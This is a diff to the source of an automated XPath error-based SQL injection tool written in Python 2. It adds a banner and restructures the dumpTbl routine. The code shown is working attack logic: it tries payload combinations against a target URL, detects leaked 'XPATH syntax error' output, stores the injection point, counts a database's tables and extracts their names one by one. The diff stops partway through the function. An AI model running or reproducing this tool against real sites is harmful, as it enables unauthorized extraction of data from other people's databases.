@@ -1,22 +1,26 @@
-#!/usr/bin/env python
-# Xpath SQL Injection by r0ot h3x49
+#!/usr/bin/python
 
-# imports
-from urllib2 import *
-import optparse
-import sys
-from queries import *
-from Output import *
-from time import time as timer
-from time import *
-import os
-from os.path import expanduser
-from urlparse import urlsplit as us
-from prettytable import PrettyTable as pt
-from itertools import *
-import httplib
-import requests
+#######################################################
+#   xpath tool v1.0 - Automated Xpath Sql Injection   #
+#       Author: Nasir khan (r0ot h3x49)               #
+#######################################################
 
+#######################################################
+from urllib2 import *                                 #
+import optparse                                       #
+import sys                                            #
+from queries import *                                 #
+from Output import *                                  #
+from time import time as timer                        #
+from time import *                                    #
+import os                                             #
+from os.path import expanduser                        #
+from urlparse import urlsplit as us                   #
+from prettytable import PrettyTable as pt             #
+from itertools import *                               #
+import httplib                                        #
+import requests                                       #
+#######################################################
 
 def xpbanner():
     YELLOW = "\033[1;33m"
@@ -36,7 +40,6 @@ applicable local, state and federal laws. Developer assume no liability and are 
     print fg + sb + disc
 
 def PathToTheOutput(url):
-    # Test on  Windows 7
     global logs,payload,logFile,payloadFile,path,Xpath,Output,target
     dirXpath = '.Xpath'
     dirOutput = 'output'
@@ -2892,29 +2895,312 @@ def  dumpTbl(url, data, db):
         try:
             tempf = open(payload,'r')
         except (Exception, IOError) as e:
-            if 'No such file or directory' in e:
-                vul = False
-                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
-                    try:
-                        if not vul:
-                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
-                            if '*' in url:
-                                first, last = url.split('*')
-                                tgt = first + temp + last
-                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
-                            else:
-                                tgt = url + temp
+            try:
+                if 'No such file or directory' in e:
+                    vul = False
+                    for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
+                        try:
+                            if not vul:
+                                temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
+                                if '*' in url:
+                                    first, last = url.split('*')
+                                    tgt = first + temp + last
+                                    #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
+                                else:
+                                    tgt = url + temp
+                                try:
+                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
+                                    req = Request(tgt, headers={'User-agent':ua})
+                                    HTTPReqCount += 1
+                                    resp = urlopen(req, timeout=10)
+                                except URLError as e:
+                                    URLError()
+                                    sleep(1)
+                                    pass
+                                except HTTPError as e:
+    ##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                    sleep(1)
+                                    pass
+                                except (IOError, httplib.HTTPException) as e:
+                                    ConnTimeOut()
+                                    pass
+                                except KeyboardInterrupt:
+                                    KeyBoardInterrupt()
+                                    break
+                                else:
+                                    try:
+                                        respdata = resp.read()
+                                        retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                        if 'XPATH syntax error' in respdata:
+                                            vul = True
+                                            print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
+                                            infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                            print fw + sn + 'Parameter: (GET)'
+                                            infos += 'Parameter: (GET)\n'
+                                            print fw + sn + '\tType: error-based'
+                                            infos += '\tType: error-based\n'
+                                            print fw + sn + '\tTitle: %s' % test
+                                            infos += '\tTitle: %s\n' % test
+                                            print fw + sn + '\tPayload: %s' % tgt
+                                            infos += '\tPayload: %s\n' % tgt
+                                            # ----------------------------------------
+                                            # for later usage of dumiping other things
+                                            CreatePayloadFile()
+                                            with open(payload,'w') as ft:
+                                                ft.write('%s' % tgt)
+                                                ft.close()
+                                            # ----------------------------------------
+                                            print fw + sn + '---'
+                                            infos += '---\n'
+                                    except IndexError as e:
+                                        pass
+                                    except Exception as e:
+                                        #print '[-] %s' % e
+                                        pass
+                                    except KeyboardInterrupt:
+                                        KeyBoardInterrupt()
+                                        break
+                                    else:
+                                        Query_Test = False
+                                        if wsr and war:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                                            infos += "web server technology: %s, %s\n" % (war, wsr)
+                                        else:
+                                            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                                            infos += "web server technology: %s\n" % wsr
+                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                                        infos += "the back-end DBMS: MySQL\n"
+                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
+                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
+                                        for QueryIndex in TBL_COUNT_FROM_DBS:
+                                            if not Query_Test:
+                                                QueryToTest = QueryIndex % (db.encode('hex','strict'))
+                                                if '0x72306f74' in tgt:
+                                                    FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                    try:
+                                                        req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
+                                                        resp = urlopen(req, timeout=10)
+                                                    except URLError as e:
+                                                        URLError()
+                                                        sleep(1)
+                                                        pass
+                                                    except HTTPError as e:
+    ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                        sleep(1)
+                                                        pass
+                                                    except (IOError, httplib.HTTPException) as e:
+                                                        ConnTimeOut()
+                                                        pass
+                                                    except KeyboardInterrupt:
+                                                        KeyBoardInterrupt()
+                                                        break
+                                                    else:
+                                                        try:
+                                                            respdata = resp.read()
+                                                            no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                            if 'XPATH syntax error' in respdata:
+                                                                Query_Test = True
+                                                                QueryToDumpDbNames = FinalCountQuery_replaced
+                                                                #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                                                if '0' in no_of_tbls:
+                                                                    print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                                                    break
+                                                                else:
+                                                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                                                # Query for dumping table
+                                                                dbvul = False
+                                                                for QueryIndex in TBL_DUMP_FROM_DBS:
+                                                                    if not dbvul:
+                                                                        #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
+                                                                        QueryToTest = QueryIndex % (db.encode('hex','strict'))
+                                                                        if '0x72306f74' in tgt:
+                                                                            FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                                            try:
+                                                                                req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
+                                                                                resp = urlopen(req, timeout=10)
+                                                                            except URLError as e:
+                                                                                URLError()
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except HTTPError as e:
+    ##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                sleep(1)
+                                                                                pass
+                                                                            except (IOError, httplib.HTTPException) as e:
+                                                                                ConnTimeOut()
+                                                                                pass
+                                                                            except KeyboardInterrupt:
+                                                                                KeyBoardInterrupt()
+                                                                                break
+                                                                            else:
+                                                                                try:
+                                                                                    respdata = resp.read()
+                                                                                    isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                    if 'XPATH syntax error' in respdata:
+                                                                                        dbvul = True
+                                                                                        DbDumpQuery = FinalCountQuery_replaced
+                                                                                        temp = 0
+                                                                                        noT = int(no_of_tbls)
+                                                                                        infos += "Database: %s\n"%db
+                                                                                        infos += "["+str(noT)+" tables]\n"
+                                                                                        #tmp = ""
+                                                                                        while temp < noT:
+                                                                                            if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                                            elif 'LIMIT%200' in DbDumpQuery:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
+                                                                                            else:
+                                                                                                tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                                                
+                                                                                            try:
+                                                                                                req = Request(tempQuery, headers={'User-agent':ua})
+                                                                                                resp = urlopen(req, timeout=10)
+                                                                                            except URLError as e:
+                                                                                                URLError()
+                                                                                                if temp == 0:
+                                                                                                    temp = 0
+                                                                                                else:
+                                                                                                    temp = temp
+                                                                                                sleep(1)
+                                                                                                pass
+                                                                                            except HTTPError as e:
+    ##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                                                sleep(1)
+                                                                                                pass
+                                                                                            except (IOError, httplib.HTTPException) as e:
+                                                                                                ConnTimeOut()
+                                                                                                if temp == 0:
+                                                                                                    temp = 0
+                                                                                                else:
+                                                                                                    temp = temp
+                                                                                                sleep(1)
+                                                                                                pass
+                                                                                            except KeyboardInterrupt:
+                                                                                                print fg + sb + "Database: %s" % db
+                                                                                                print fg + sb + "[ Dumped "+str(temp)+" tables]:"
+                                                                                                #print fg + sb + tmp
+                                                                                                tab = pt(["tables"])
+                                                                                                tab.align = "l"
+                                                                                                tab.header = False
+                                                                                                for tbl in dumps:
+                                                                                                    tab.add_row([tbl])
+                                                                                                    pass
+                                                                                                print fg + sb + str(tab)
+                                                                                                f.write(infos)
+                                                                                                f.write(str(tab)+"\n")
+                                                                                                f.close()
+                                                                                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                                                                                                KeyBoardInterrupt()
+                                                                                                break
+                                                                                            else:
+                                                                                                try:
+                                                                                                    respdata = resp.read()
+                                                                                                    name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                                                    if 'XPATH syntax error' in respdata:
+                                                                                                        print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
+                                                                                                        #infos += "[*] %s\n" % name_of_tbls
+                                                                                                        #tmp += "[*] %s\n" % name_of_tbls
+                                                                                                        dumps.append(name_of_tbls)
+                                                                                                        temp += 1
+                                                                                                        
+                                                                                                except IndexError as e:
+                                                                                                    pass
+                                                                                                except Exception as e:
+                                                                                                    #print '[-] %s' % e
+                                                                                                    #sys.exit(0)
+                                                                                                    pass
+                                                                                                except KeyboardInterrupt:
+                                                                                                    KeyBoardInterrupt()
+                                                                                                    break
+                                                                                        print fg + sb + "Database: %s" %db
+                                                                                        print fg + sb + "["+str(noT)+" tables]"
+                                                                                        #print fg + sb + tmp
+                                                                                        tab = pt(["tables]"])
+                                                                                        tab.align = "l"
+                                                                                        tab.header = False
+                                                                                        for tbl in dumps:
+                                                                                            tab.add_row([tbl])
+                                                                                            pass
+                                                                                        print fg + sb + str(tab) 
+                                                                                            
+                                                                                except IndexError as e:
+                                                                                    pass
+                                                                                except Exception as e:
+                                                                                    #print '[-] %s' % e
+                                                                                   # sys.exit(0)
+                                                                                    pass
+                                                                                except KeyboardInterrupt:
+                                                                                    KeyBoardInterrupt()
+                                                                                    break
+                                                                    if dbvul:
+                                                                        break
+                                                                    # TBL DUMP END
+                                                        except IndexError as e:
+                                                            pass
+                                                        except Exception as e:
+                                                            #print '[-] %s' % e
+                                                            #sys.exit(0)
+                                                            pass
+                                                        except KeyboardInterrupt:
+                                                            KeyBoardInterrupt()
+                                                            break
+                                            if Query_Test:
+                                                break            
+                            if vul:
+                                break
+                        except (TypeError, IOError, IndexError):
+                            pass
+                        except KeyboardInterrupt:
+                            KeyBoardInterrupt()
+                            break      
+                f.write(infos)
+                f.write(str(tab)+"\n")
+                f.close()
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+            except Exception as e:
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                pass
+                                                                            
+        else:
+            try:
+                print fw + sn + "xpath resumed the following injection point(s) from stored session:"
+                infos += "\nxpath resumed the following injection point(s) from stored session:\n"
+                with open(logs, "r") as prev_session:
+                    for line in islice(prev_session,1,7):
+                        out = line.rstrip()
+                        if out:
+                            print fw + sn + out
+                            infos += out+"\n"
+                prev_session.close()
+                Query_Test = False
+                tempfread = tempf.readline()
+                url = None
+                if wsr and war:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
+                    infos += "web server technology: %s, %s\n" % (war, wsr)
+                else:
+                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
+                    infos += "web server technology: %s\n" % wsr
+                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
+                infos += "the back-end DBMS: MySQL\n"
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
+                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
+                for QueryIndex in TBL_COUNT_FROM_DBS:
+                    if not Query_Test:
+                        QueryToTest = QueryIndex % (db.encode('hex','strict'))
+                        if '0x72306f74' in tempfread:
+                            FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                             try:
-                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
-                                req = Request(tgt, headers={'User-agent':ua})
-                                HTTPReqCount += 1
+                                req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                 resp = urlopen(req, timeout=10)
                             except URLError as e:
                                 URLError()
                                 sleep(1)
                                 pass
                             except HTTPError as e:
-##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+    ##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                 sleep(1)
                                 pass
                             except (IOError, httplib.HTTPException) as e:
@@ -2926,429 +3212,164 @@ def  dumpTbl(url, data, db):
                             else:
                                 try:
                                     respdata = resp.read()
-                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                    no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                     if 'XPATH syntax error' in respdata:
-                                        vul = True
-                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
-                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                        print fw + sn + 'Parameter: (GET)'
-                                        infos += 'Parameter: (GET)\n'
-                                        print fw + sn + '\tType: error-based'
-                                        infos += '\tType: error-based\n'
-                                        print fw + sn + '\tTitle: %s' % test
-                                        infos += '\tTitle: %s\n' % test
-                                        print fw + sn + '\tPayload: %s' % tgt
-                                        infos += '\tPayload: %s\n' % tgt
-                                        # ----------------------------------------
-                                        # for later usage of dumiping other things
-                                        CreatePayloadFile()
-                                        with open(payload,'w') as ft:
-                                            ft.write('%s' % tgt)
-                                            ft.close()
-                                        # ----------------------------------------
-                                        print fw + sn + '---'
-                                        infos += '---\n'
-                                except IndexError as e:
-                                    pass
-                                except Exception as e:
-                                    #print '[-] %s' % e
-                                    pass
-                                except KeyboardInterrupt:
-                                    KeyBoardInterrupt()
-                                    break
-                                else:
-                                    Query_Test = False
-                                    if wsr and war:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                                        infos += "web server technology: %s, %s\n" % (war, wsr)
-                                    else:
-                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                                        infos += "web server technology: %s\n" % wsr
-                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-                                    infos += "the back-end DBMS: MySQL\n"
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
-                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
-                                    for QueryIndex in TBL_COUNT_FROM_DBS:
-                                        if not Query_Test:
-                                            QueryToTest = QueryIndex % (db.encode('hex','strict'))
-                                            if '0x72306f74' in tgt:
-                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
-                                                try:
-                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                    resp = urlopen(req, timeout=10)
-                                                except URLError as e:
-                                                    URLError()
-                                                    sleep(1)
-                                                    pass
-                                                except HTTPError as e:
-##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                    sleep(1)
-                                                    pass
-                                                except (IOError, httplib.HTTPException) as e:
-                                                    ConnTimeOut()
-                                                    pass
-                                                except KeyboardInterrupt:
-                                                    KeyBoardInterrupt()
-                                                    break
-                                                else:
+                                        Query_Test = True
+                                        QueryToDumpDbNames = FinalCountQuery_replaced
+                                        #print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                        if '0' in no_of_tbls:
+                                            print fr + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                            break
+                                        else:
+                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
+                                        # Query for dumping table
+                                        dbvul = False
+                                        for QueryIndex in TBL_DUMP_FROM_DBS:
+                                            if not dbvul:
+                                                #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
+                                                QueryToTest = QueryIndex % (db.encode('hex','strict'))
+                                                if '0x72306f74' in tempfread:
+                                                    FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                                                     try:
-                                                        respdata = resp.read()
-                                                        no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                        if 'XPATH syntax error' in respdata:
-                                                            Query_Test = True
-                                                            QueryToDumpDbNames = FinalCountQuery_replaced
-                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] the SQL query used returns %s entries" % no_of_tbls
-                                                            # Query for dumping table
-                                                            dbvul = False
-                                                            for QueryIndex in TBL_DUMP_FROM_DBS:
-                                                                if not dbvul:
-                                                                    #QueryToTest = ('%s' % QueryIndex).replace(" " if inline_comment else "/**/","/**/")
-                                                                    QueryToTest = QueryIndex % (db.encode('hex','strict'))
-                                                                    if '0x72306f74' in tgt:
-                                                                        FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
+                                                        req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
+                                                        resp = urlopen(req, timeout=10)
+                                                    except URLError as e:
+                                                        URLError()
+                                                        sleep(1)
+                                                        pass
+                                                    except HTTPError as e:
+    ##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                        sleep(1)
+                                                        pass
+                                                    except (IOError, httplib.HTTPException) as e:
+                                                        ConnTimeOut()
+                                                        pass
+                                                    except KeyboardInterrupt:
+                                                        KeyBoardInterrupt()
+                                                        break
+                                                    else:
+                                                        try:
+                                                            respdata = resp.read()
+                                                            isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                            if 'XPATH syntax error' in respdata:
+                                                                dbvul = True
+                                                                DbDumpQuery = FinalCountQuery_replaced
+                                                                temp = 0
+                                                                noT = int(no_of_tbls)
+                                                                infos += "Database: %s\n" % db
+                                                                infos += "["+str(noT)+" tables]\n"
+                                                                #tmp = ""
+                                                                while temp < noT:
+                                                                    if 'LIMIT/**_**/0' in DbDumpQuery:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
+                                                                    elif 'LIMIT%20' in DbDumpQuery:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
+                                                                    else:
+                                                                        tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
+                                                                        
+                                                                    try:
+                                                                        req = Request(tempQuery, headers={'User-agent':ua})
+                                                                        resp = urlopen(req, timeout=10)
+                                                                    except URLError as e:
+                                                                        URLError()
+                                                                        if temp == 0:
+                                                                            temp = 0
+                                                                        else:
+                                                                            temp = temp
+                                                                        sleep(1)
+                                                                        pass
+                                                                    except HTTPError as e:
+    ##                                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
+                                                                        sleep(1)
+                                                                        pass
+                                                                    except (IOError, httplib.HTTPException) as e:
+                                                                        ConnTimeOut()
+                                                                        if temp == 0:
+                                                                            temp = 0
+                                                                        else:
+                                                                            temp = temp
+                                                                        sleep(1)
+                                                                        pass
+                                                                    except KeyboardInterrupt:
+                                                                        print fw + sn + "Database: %s" % db
+                                                                        print fw + sn + "[Dumped "+str(temp)+" tables]"
+                                                                        #print fw + sn + tmp
+                                                                        tab = pt(["tables"])
+                                                                        tab.align = "l"
+                                                                        tab.header = False
+                                                                        for tbl in dumps:
+                                                                            tab.add_row([tbl])
+                                                                            pass
+                                                                        print fw + sn + str(tab) 
+                                                                        f.write(infos)
+                                                                        f.write(str(tab)+"\n")
+                                                                        f.close()
+                                                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
+                                                                        KeyBoardInterrupt()
+                                                                        break
+                                                                    else:
                                                                         try:
-                                                                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                                                                            resp = urlopen(req, timeout=10)
-                                                                        except URLError as e:
-                                                                            URLError()
-                                                                            sleep(1)
+                                                                            respdata = resp.read()
+                                                                            name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
+                                                                            if 'XPATH syntax error' in respdata:
+                                                                                print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
+                                                                                #infos += "[*] %s\n" % name_of_tbls
+                                                                                #tmp += "[*] %s\n" % name_of_tbls
+                                                                                dumps.append(name_of_tbls)
+                                                                                temp += 1
+                                                                                
+                                                                        except IndexError as e:
                                                                             pass
-                                                                        except HTTPError as e:
-##                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                            sleep(1)
-                                                                            pass
-                                                                        except (IOError, httplib.HTTPException) as e:
-                                                                            ConnTimeOut()
+                                                                        except Exception as e:
+                                                                            #print '[-] %s' % e
+                                                                           # sys.exit(0)
                                                                             pass
                                                                         except KeyboardInterrupt:
                                                                             KeyBoardInterrupt()
                                                                             break
-                                                                        else:
-                                                                            try:
-                                                                                respdata = resp.read()
-                                                                                isTrue_dbs = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                if 'XPATH syntax error' in respdata:
-                                                                                    dbvul = True
-                                                                                    DbDumpQuery = FinalCountQuery_replaced
-                                                                                    temp = 0
-                                                                                    noT = int(no_of_tbls)
-                                                                                    infos += "Database: %s\n"%db
-                                                                                    infos += "["+str(noT)+" tables]\n"
-                                                                                    #tmp = ""
-                                                                                    while temp < noT:
-                                                                                        if 'LIMIT/**_**/0' in DbDumpQuery:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT/**_**/0','LIMIT/**_**/%d' % temp)
-                                                                                        elif 'LIMIT%200' in DbDumpQuery:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT%200','LIMIT%%20%d' % temp)
-                                                                                        else:
-                                                                                            tempQuery = DbDumpQuery.replace('LIMIT+0','LIMIT+%d' % temp)
-                                                                                            
-                                                                                        try:
-                                                                                            req = Request(tempQuery, headers={'User-agent':ua})
-                                                                                            resp = urlopen(req, timeout=10)
-                                                                                        except URLError as e:
-                                                                                            URLError()
-                                                                                            if temp == 0:
-                                                                                                temp = 0
-                                                                                            else:
-                                                                                                temp = temp
-                                                                                            sleep(1)
-                                                                                            pass
-                                                                                        except HTTPError as e:
-##                                                                                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                                                                                            sleep(1)
-                                                                                            pass
-                                                                                        except (IOError, httplib.HTTPException) as e:
-                                                                                            ConnTimeOut()
-                                                                                            if temp == 0:
-                                                                                                temp = 0
-                                                                                            else:
-                                                                                                temp = temp
-                                                                                            sleep(1)
-                                                                                            pass
-                                                                                        except KeyboardInterrupt:
-                                                                                            print fg + sb + "Database: %s" % db
-                                                                                            print fg + sb + "[ Dumped "+str(temp)+" tables]:"
-                                                                                            #print fg + sb + tmp
-                                                                                            tab = pt(["tables"])
-                                                                                            tab.align = "l"
-                                                                                            tab.header = False
-                                                                                            for tbl in dumps:
-                                                                                                tab.add_row([tbl])
-                                                                                                pass
-                                                                                            print fg + sb + str(tab)
-                                                                                            f.write(infos)
-                                                                                            f.write(str(tab)+"\n")
-                                                                                            f.close()
-                                                                                            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-                                                                                            KeyBoardInterrupt()
-                                                                                            break
-                                                                                        else:
-                                                                                            try:
-                                                                                                respdata = resp.read()
-                                                                                                name_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                                                                                if 'XPATH syntax error' in respdata:
-                                                                                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % name_of_tbls
-                                                                                                    #infos += "[*] %s\n" % name_of_tbls
-                                                                                                    #tmp += "[*] %s\n" % name_of_tbls
-                                                                                                    dumps.append(name_of_tbls)
-                                                                                                    temp += 1
-                                                                                                    
-                                                                                            except IndexError as e:
-                                                                                                pass
-                                                                                            except Exception as e:
-                                                                                                #print '[-] %s' % e
-                                                                                                #sys.exit(0)
-                                                                                                pass
-                                                                                            except KeyboardInterrupt:
-                                                                                                KeyBoardInterrupt()
-                                                                                                break
-                                                                                    print fg + sb + "Database: %s" %db
-                                                                                    print fg + sb + "["+str(noT)+" tables]"
-                                                                                    #print fg + sb + tmp
-                                                                                    tab = pt(["tables]"])
-                                                                                    tab.align = "l"
-                                                                                    tab.header = False
-                                                                                    for tbl in dumps:
-                                                                                        tab.add_row([tbl])
-                                                                                        pass
-                                                                                    print fg + sb + str(tab) 
-                                                                                        
-                                                                            except IndexError as e:
-                                                                                pass
-                                                                            except Exception as e:
-                                                                                #print '[-] %s' % e
-                                                                               # sys.exit(0)
-                                                                                pass
-                                                                            except KeyboardInterrupt:
-                                                                                KeyBoardInterrupt()
-                                                                                break
-                                                                if dbvul:
-                                                                    break
-                                                                # TBL DUMP END
-                                                    except IndexError as e:
-                                                        pass
-                                                    except Exception as e:
-                                                        #print '[-] %s' % e
-                                                        #sys.exit(0)
-                                                        pass
-                                                    except KeyboardInterrupt:
-                                                        KeyBoardInterrupt()
-                                                        break
-                                        if Query_Test:
-                                            break            
-                        if vul:
-                            break
-                    except (TypeError, IOError, IndexError):
-                        pass
-                    except KeyboardInterrupt:
-                        KeyBoardInterrupt()
-                        break      
-            f.write(infos)
-            f.write(str(tab)+"\n")
-            f.close()
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
-                                                                            
-        else:
-            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
-            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
-            with open(logs, "r") as prev_session:
-                for line in islice(prev_session,1,7):
-                    out = line.rstrip()
-                    if out:
-                        print fw + sn + out
-                        infos += out+"\n"
-            prev_session.close()
-            Query_Test = False
-            tempfread = tempf.readline()
-            url = None
-            if wsr and war:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
-                infos += "web server technology: %s, %s\n" % (war, wsr)
-            else:
-                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
-                infos += "web server technology: %s\n" % wsr
-            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS: MySQL"
-            infos += "the back-end DBMS: MySQL\n"
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching table names"
-            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching number of tables"
-            for QueryIndex in TBL_COUNT_FROM_DBS:
-                if not Query_Test:
-                    QueryToTest = QueryIndex % (db.encode('hex','strict'))
-                    if '0x72306f74' in tempfread:
-                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
-                        try:
-                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
-                            resp = urlopen(req, timeout=10)
-                        except URLError as e:
-                            URLError()
-                            sleep(1)
-                            pass
-                        except HTTPError as e:
-##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
-                            sleep(1)
-                            pass
-                        except (IOError, httplib.HTTPException) as e:
-                            ConnTimeOut()
-                            pass
-                        except KeyboardInterrupt:
-                            KeyBoardInterrupt()
-                            break
-                        else:
-                            try:
-                                respdata = resp.read()
-                                no_of_tbls = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
-                                if 'XPATH syntax error' in respdata:
-                                    Query_Test = True
-                                    QueryToDumpDbNames = FinalCountQuery_replaced
